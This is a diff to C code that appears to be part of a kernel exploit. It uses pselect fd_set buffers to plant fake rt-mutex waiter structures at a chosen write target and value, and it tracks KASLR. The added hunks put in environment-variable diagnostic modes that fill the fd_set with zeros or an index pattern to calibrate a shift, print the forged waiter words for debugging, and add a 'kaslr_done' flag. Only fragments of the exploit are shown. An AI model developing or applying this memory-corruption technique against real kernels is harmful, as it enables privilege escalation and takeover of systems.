@@ -73,6 +73,27 @@ static void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
   FD_ZERO(out);
   FD_ZERO(ex);
 
+  // Check for diagnostic test mode
+  int test_mode = getenv("PSELECT_TEST_ZERO") ? 1 : 0;
+  int test_pattern = getenv("PSELECT_TEST_PATTERN") ? 1 : 0;
+  
+  if (test_mode) {
+    // Safe test: fill with zeros to verify pselect reclaim works
+    pr_warning("PSELECT_TEST_ZERO: using all-zero fd_set for safety test\n");
+    // fd_set already zeroed by FD_ZERO
+    return;
+  }
+  
+  if (test_pattern) {
+    // Diagnostic: fill with index pattern to determine PSELECT_SHIFT
+    pr_warning("PSELECT_TEST_PATTERN: filling fd_set with index pattern\n");
+    unsigned long *bits = (unsigned long *)in;
+    for (int i = 0; i < 16; i++) {
+      bits[i] = (unsigned long)(i + 1) * 0x1111111111111111ULL;
+    }
+    return;
+  }
+
   uintptr_t target = pselect_write_target();
   uintptr_t value = pselect_write_value();
   uintptr_t parent = value;
@@ -107,6 +128,13 @@ static void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
     {8, FAKE_WAITER_PRIO, "prio"},      /* 0x40 */
     {9, 0, "deadline"},                 /* 0x48 */
   };
+  
+  // Print waiter word values for debugging
+  pr_info("fake waiter words:\n");
+  for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
+    pr_info("  w%d (%s) = %016llx\n", words[i].word, words[i].name, 
+            (unsigned long long)words[i].value);
+  }
 
   int words_per_set = pselect_words_per_set();
   for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
@@ -180,3 +208,4 @@ void do_pselect_fake_lock_route(void) {
 
   pr_error("pselect route exhausted\n");
 }
+int kaslr_done;
